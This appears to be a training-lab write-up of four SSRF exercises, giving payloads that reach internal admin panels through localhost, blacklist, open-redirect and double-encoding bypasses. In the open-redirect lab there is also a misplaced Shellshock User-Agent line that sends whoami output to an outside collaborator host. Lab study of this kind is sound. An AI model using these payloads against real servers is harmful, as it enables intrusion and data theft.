## Introduction

SSRF (Server-Side Request Forgery) is a web security vulnerability that allows an attacker to make a server send requests to unintended destinations.

## Labs


### 01. Basic SSRF against the local server

I captured the stock check request in Burp Suite. I found that the `stockApi` parameter sends a request to a URL.

<img src="/assets/posts/SSRF/image.png" width="700" >

I changed the stockApi value to http://localhost. The server accessed the local server and displayed the admin panel.

<img src="/assets/posts/SSRF/image (1).png" width="700" >

I found the delete endpoint in the admin panel. I sent a request to this endpoint using SSRF.

<img src="/assets/posts/SSRF/image (2).png" width="700" >

I used the /admin/delete?username=carlos endpoint to delete the carlos user. I solved the lab.

<img src="/assets/posts/SSRF/image (3).png" width="700" >

- injection

```php
stockApi=http://localhost/admin/delete?username=carlos
```

### 04. SSRF with blacklist-based input filter

I captured the stock check request in Burp Suite. I confirmed that the `stockApi` parameter could access internal addresses.

<img src="/assets/posts/SSRF/image (13).png" width="700" >

I tested the `127.0.0.1` address, but the request was blocked. The application was using a blacklist filter.

<img src="/assets/posts/SSRF/image (14).png" width="700" >

I used the `127.0.0.2` address to bypass the blacklist filter. This allowed me to access the admin panel.

<img src="/assets/posts/SSRF/image (15).png" width="700" >

I opened the `/admin` endpoint. I found the admin panel and the delete endpoint.

<img src="/assets/posts/SSRF/image (16).png" width="700" >

I bypassed the filter and sent a request to the `/admin/delete` endpoint. I targeted the **carlos** user.

<img src="/assets/posts/SSRF/image (17).png" width="700" >

I bypassed the filter and sent a request to the `/admin/delete` endpoint. I targeted the **carlos** user.

<img src="/assets/posts/SSRF/image (18).png" width="700" >

- Injection

```php
stockApi=http://127.0.0.2/aDmin/delete?username=carlos
```

I bypassed the blacklist-based SSRF filter, deleted the **carlos** user, and solved the lab.

### 05. SSRF with filter bypass via open redirection vulnerability

I confirmed that the `stockApi` parameter worked correctly when it was URL-decoded.

<img src="/assets/posts/SSRF/image (19).png" width="700" >

Sending the same request in an encoded form caused the application to return a Missing parameter error.

<img src="/assets/posts/SSRF/image (20).png" width="700" >

I tried setting the `stockApi` value to `http://localhost`, but the application rejected it as an Invalid URL.

<img src="/assets/posts/SSRF/image (21).png" width="700" >

Submitting only a relative path (`/`) was accepted, indicating that the application only allowed internal paths.

<img src="/assets/posts/SSRF/image (22).png" width="700" >

Since relative paths were accepted, I started exploring other endpoints and discovered the `nextProduct` endpoint.

I confirmed that the `nextProduct` endpoint performed a **302 redirect** through the `path` parameter.

<img src="/assets/posts/SSRF/image (23).png" width="700" >

By supplying different values to the `path` parameter, I confirmed that the application redirected to arbitrary locations.

<img src="/assets/posts/SSRF/image (24).png" width="700" >

I attempted to use the discovered Open Redirect endpoint inside the `stockApi` parameter.

<img src="/assets/posts/SSRF/image (25).png" width="700" >


<img src="/assets/posts/SSRF/image (26).png" width="700" >

The first attempt failed because the required `path` parameter was missing, resulting in a **Missing parameter 'path'** error.

<img src="/assets/posts/SSRF/image (27).png" width="700" >

I modified the Open Redirect endpoint to redirect the request to the internal admin panel and forwarded the SSRF request through it.

<img src="/assets/posts/SSRF/image (28).png" width="700" >

Finally, the redirect chain reached `/admin/delete?username=carlos`, the **carlos** user was deleted, and the lab was completed.

<img src="/assets/posts/SSRF/image (29).png" width="700" >

- Injection

```php
stockApi=/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
```

Captured the normal request.

```php
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).0stpmkyafabx8tmdt8k8o2sck3quek29.oastify.com

```

### 07. SSRF with whitelist-based input filter

Tried `http://127.0.0.1`, but the application only accepted the **stock.weliketoshop.net** host.

<img src="/assets/posts/SSRF/image (34).png" width="700" >

Tried using `username@stock.weliketoshop.net`, but the request could not connect to the stock check service.

<img src="/assets/posts/SSRF/image (35).png" width="700" >

Added `#` after the username, but it was blocked.

<img src="/assets/posts/SSRF/image (36).png" width="700" >

Encoded `#` as `%23`, but the request was still blocked.

<img src="/assets/posts/SSRF/image (37).png" width="700" >

Double encoded `#` (`%2523`). This bypassed the whitelist validation.

“#” → %23 → %2523

<img src="/assets/posts/SSRF/image (38).png" width="700" >

Used `http://localhost%2523stock.weliketoshop.net`. The request reached the internal application.

<img src="/assets/posts/SSRF/image (39).png" width="700" >

Added the `/admin` path and opened the admin panel.

<img src="/assets/posts/SSRF/image (40).png" width="700" >

Sent a request to `/admin/delete?username=carlos` and deleted the **carlos** user.

<img src="/assets/posts/SSRF/image (41).png" width="700" >

- Injection

```php
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
